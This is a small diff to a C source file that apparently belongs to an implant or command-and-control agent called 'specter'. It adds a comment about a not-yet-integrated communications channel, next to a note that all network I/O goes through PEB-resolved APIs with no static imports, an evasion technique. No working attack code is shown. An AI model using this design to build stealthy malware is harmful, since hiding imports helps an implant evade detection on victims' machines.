@@ -8,6 +8,10 @@
  * All network I/O through PEB-resolved APIs — no static imports.
  */
 
+/* Phase 1+ channel implementation. Fully coded but not dispatched from
+   the main comms_checkin path. Integration requires Phase 1.1 channel
+   abstraction (see roadmap.md). */
+
 #include "specter.h"
 #include "ntdefs.h"
 #include "peb.h"
